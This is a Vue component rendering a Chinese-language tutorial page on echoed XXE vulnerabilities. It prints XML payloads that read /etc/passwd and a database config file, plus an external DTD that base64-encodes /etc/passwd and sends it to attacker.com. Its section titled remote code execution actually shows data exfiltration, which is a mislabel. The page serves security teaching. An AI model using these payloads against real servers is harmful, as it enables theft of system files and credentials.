<template>
        <div class="xss-container">
          <div id="xss-test"></div>
          <el-row>
            <el-col :span="19">
              <div ref="containerRef" style="color: #fff;height: 650px; overflow-y: auto">
                <div id="part0" style="height: 100px;"></div>
                <div id="part2" style="height: auto;">
                  <el-text size="large" style="color:#fff; line-height: 3.6;">
                    <div id="p2" style="height: auto;">
                      <h1 class="title">有回显的XXE漏洞</h1>
                      <el-divider />
                      <br>
                      <h2 class="sub-title" id="p2-1">原理</h2>
                      <p>当攻击者构造包含恶意外部实体引用的 <el-tag style="color:#e1567b" type="info"
                              size="large">XML</el-tag>
                        数据,并将其提交给存在漏洞的应用程序时,应用程序的 <el-tag style="color:#e1567b"
                              type="info" size="large">XML</el-tag>
                        解析器会尝试加载并解析这些外部实体.如果解析器没有对外部实体的引用进行严格的验证和过滤,攻击者就可以利用这一点,让解析器加载并返回敏感信息,如文件内容、数据库连接信息等.<br>
                        由于有回显的 <el-tag style="color:#e1567b"
                              type="info">XXE</el-tag>
                        漏洞允许攻击者直接获取服务器的响应结果,因此攻击者可以通过观察响应内容来判断攻击是否成功.
                      </p>
                      <br>
                      <h2 class="sub-title" id="p2-2">攻击手段</h2>
                      <br>
                      <ul>
                        <li>
                          <h3 class="sub-sub-title" id="p2-2-1">文件读取</h3>
                          <p>攻击者可以利用 <el-tag style="color:#e1567b"
                                  type="info">XXE</el-tag>
                            漏洞读取服务器上的文件.以下是一个详细的示例:</p>
                          <el-card style="max-width:750px; background-color:#282C34; color: #fff; font-family: 'Courier New', Courier, monospace;"
                            body-style="line-height: 2">
                            <span class="code">
                              &lt;?<span class="func">xml</span>&nbsp;<span class="num">version</span>="<span
                                class="v">1.0</span>"&nbsp;<span class="num">encoding</span>="<span
                                class="v">UTF-8</span>"?&gt;<br>
                              &lt;<span class="lev0">!DOCTYPE</span>
                              <span class="func"> Root</span>
                              [<br>
                              &nbsp;&nbsp;&nbsp;&nbsp;&lt;!
                              <span class="num">ENTITY</span>
                              <span class="v"> xxe</span>
                              <span class="num"> SYSTEM</span>
                              "<span class="lev2">file:///etc/passwd</span>"
                              &gt;<br>
                              ]&gt;
                              <br>
                              <br>
                              &lt;<span class="func">Root</span>&gt;<br>
                              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="v">&xxe;</span><br>
                              &lt;/<span class="func">Root</span>&gt;
                            </span>
                          </el-card>
                          <br>
                          <p>在这个示例中,定义了一个名为 <el-tag style="color:#e1567b"
                                  type="info">xxe</el-tag>
                            的外部实体,其引用的资源是
                            <el-tag style="color:#e1567b"
                              type="info">file:///etc/passwd</el-tag>.<br>当服务器解析该
                            XML 文档时,会将 <el-tag style="color:#e1567b"
                              type="info">/etc/passwd</el-tag>
                            文件的内容替换
                            <el-tag style="color:#e1567b"
                              type="info">&xxe;</el-tag>
                            引用,并将结果回显给攻击者.<br>攻击者可以通过观察响应内容来获取文件的内容.
                          </p>
                          <br>
                        </li>
                        <li>
                          <h3 class="sub-sub-title" id="p2-2-2">信息泄露</h3>
                          <p>除了文件读取,攻击者还可以利用 <el-tag style="color:#e1567b"
                                  type="info">XXE</el-tag>
                            漏洞泄露服务器的敏感信息,如数据库连接信息、配置文件等.<br>
                            通过构造不同的外部实体引用,攻击者可以尝试读取服务器上的各种敏感文件.例如,攻击者可以尝试读取数据库配置文件:
                          </p>
                          <el-card style="max-width:750px; background-color:#282C34; color: #fff; font-family: 'Courier New', Courier, monospace;"
                            body-style="line-height: 2">
                            <span class="code">
                              &lt;?<span class="func">xml</span>&nbsp;<span class="num">version</span>="<span
                                class="v">1.0</span>"&nbsp;<span class="num">encoding</span>="<span
                                class="v">UTF-8</span>"?&gt;<br>
                              &lt;<span class="lev0">!DOCTYPE</span>
                              <span class="func"> Root</span>
                              [<br>
                              &nbsp;&nbsp;&nbsp;&nbsp;&lt;!
                              <span class="num">ENTITY</span>
                              <span class="v"> dbconfig</span>
                              <span class="num"> SYSTEM</span>
                              "<span class="lev2">file:///path/to/dbconfig.xml</span>"
                              &gt;<br>
                              ]&gt;
                              <br>
                              <br>
                              &lt;<span class="func">Root</span>&gt;<br>
                              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="v">&dbconfig;</span><br>
                              &lt;/<span class="func">Root</span>&gt;
                            </span>
                          </el-card>
                          <br>
                          <p>在这个示例中,定义了一个名为 <el-tag style="color:#e1567b"
                                  type="info">dbconfig</el-tag>
                            的外部实体,其引用的资源是 <el-tag
                              style="color:#e1567b"
                              type="info">file:///path/to/dbconfig.xml</el-tag>.<br>
                            如果服务器上存在该文件,并且应用程序没有对外部实体的引用进行严格的验证和过滤<br>
                            攻击者就可以通过观察响应内容来获取数据库配置文件的内容.
                          </p>
                          <br>
                        </li>
                        <li>
                          <h3 class="sub-sub-title" id="p2-2-3">远程代码执行(RCE)</h3>
                          <p>在某些情况下,攻击者还可以利用 <el-tag style="color:#e1567b"
                                  type="info">XXE</el-tag>
                            漏洞实现远程代码执行.<br>
                            例如,攻击者可以构造一个引用外部 <el-tag
                              style="color:#e1567b"
                              type="info"
                              size="large">DTD</el-tag>文件的
                            <el-tag style="color:#e1567b"
                              type="info"
                              size="large">XML</el-tag> 文档,该
                            <el-tag style="color:#e1567b"
                              type="info"
                              size="large">DTD</el-tag>
                            文件中包含恶意的实体定义<br>
                            这些实体定义可以触发服务器上的命令执行;以下是一个简单的示例:</p>
                          <p>首先,攻击者创建一个恶意的 <el-tag style="color:#e1567b"
                                  type="info"
                                  size="large">DTD</el-tag> 文件
                            evil.dtd,内容如下:</p>
                          <el-card style="max-width:850px; background-color:#282C34; color: #fff; font-family: 'Courier New', Courier, monospace;"
                            body-style="line-height: 2">
                            <span class="code">
                              &lt;!<span class="num">ENTITY</span>
                              <span class="key">%</span> <span class="v">file</span>
                              <span class="num">SYSTEM</span>
                              "<span class="lev2">php://filter/read=convert.base64-encode/resource=/etc/passwd</span>"&gt;<br>
                              &lt;!<span class="num">ENTITY</span>
                              <span class="key">%</span> <span class="v">eval</span> "
                              &lt;!<span class="num">ENTITY</span>
                              <span class="key">&#x25; </span>
                              <span class="v">exfiltrate</span>
                              <span class="num"> SYSTEM</span>
                              '<span class="lev2">http://attacker.com/?data=<span class="key">%</span><span
                                class="v">file</span>;</span>'>
                              "&gt;<br>
                              <span class="key">%</span><span class="v">eval</span>;<br>
                              <span class="key">%</span><span class="v">exfiltrate</span>;
                            </span>
                          </el-card>
                          <br>
                          <p>然后,攻击者构造一个引用该 <el-tag style="color:#e1567b"
                                  type="info"
                                  size="large">DTD</el-tag> 文件的
                            <el-tag style="color:#e1567b"
                              type="info"
                              size="large">XML</el-tag> 文档:
                          </p>
                          <el-card style="max-width:750px; background-color:#282C34; color: #fff; font-family: 'Courier New', Courier, monospace;"
                            body-style="line-height: 2">
                            <span class="code">
                              &lt;?<span class="func">xml</span>&nbsp;<span class="num">version</span>="<span
                                class="v">1.0</span>"&nbsp;<span class="num">encoding</span>="<span
                                class="v">UTF-8</span>"?&gt;<br>
                              &lt;<span class="lev0">!DOCTYPE</span>
                              <span class="v">root</span>
                              <span class="num">SYSTEM</span>
                              "<span class="lev2">http://attacker.com/evil.dtd</span>"&gt;<br>
                              &lt;<span class="func">root</span>&gt;&lt;/<span class="func">root</span>&gt;
                            </span>
                          </el-card>
                          <br>
                          <p>当服务器解析该 <el-tag style="color:#e1567b"
                                  type="info"
                                  size="large">XML</el-tag>文档时,会加载并解析外部的
                            <el-tag style="color:#e1567b"
                              type="info"
                              size="large">DTD</el-tag>
                            文件,从而触发恶意实体的执行.<br>
                            在这个示例中,攻击者将 <el-tag
                              style="color:#e1567b"
                              type="info">/etc/passwd</el-tag>
                            文件的内容进行
                            <el-tag style="color:#e1567b"
                              type="info"
                              size="large">Base64</el-tag>
                            编码,并将编码后的数据发送到攻击者控制的服务器上.
                          </p>
                        </li>
                      </ul>
                    </div>
                  </el-text>
                </div>
              </div>
            </el-col>
            <el-col :span="5">
              <el-menu :default-active="activeAnchor" class="tech-anchor" mode="vertical"
                @select="handleAnchorSelect">
                <el-menu-item-group title="本页目录">
                  <el-menu-item index="p2-1">原理</el-menu-item>
                  <el-sub-menu index="p2-2">
                    <template #title>攻击手段</template>
                    <el-menu-item index="p2-2-1">文件读取</el-menu-item>
                    <el-menu-item index="p2-2-2">信息泄露</el-menu-item>
                    <el-menu-item index="p2-2-3">远程代码执行(RCE)</el-menu-item>
                  </el-sub-menu>
                </el-menu-item-group>
              </el-menu>
            </el-col>
          </el-row>
        </div>
      </template>
      
      <script>
      export default {
        data() {
          return {
            activeAnchor: 'p2-1'
          }
        },
        methods: {
          handleAnchorSelect(index) {
            const element = document.getElementById(index);
            if (element) {
              element.scrollIntoView({ behavior: 'smooth' });
            }
          }
        }
      }
      </script>
      
      <style scoped>
      .xss-container {
        background-color: #0a1929;
        color: #fff;
        padding: 20px;
      }
      
      .title {
        color: #6ab7ff;
        font-size: 2rem;
        margin-bottom: 1rem;
      }
      
      .sub-title {
        color: #34fe97;
        font-size: 1.5rem;
        margin: 1.5rem 0 1rem;
      }
      
      .sub-sub-title {
        color: #e1567b;
        font-size: 1.2rem;
        margin: 1rem 0 0.5rem;
      }
      
      .tech-anchor {
        background-color: #0a1929;
        border-right: 1px solid rgba(106, 183, 255, 0.3);
        height: 100%;
      }
      
      .code {
        font-family: 'Courier New', Courier, monospace;
        display: block;
      }
      
      .func {
        color: #6ab7ff;
      }
      
      .num {
        color: #34fe97;
      }
      
      .v {
        color: #e1567b;
      }
      
      .lev0 {
        color: #ff9800;
      }
      
      .lev2 {
        color: #9c27b0;
      }
      
      .key {
        color: #ffeb3b;
      }
      </style>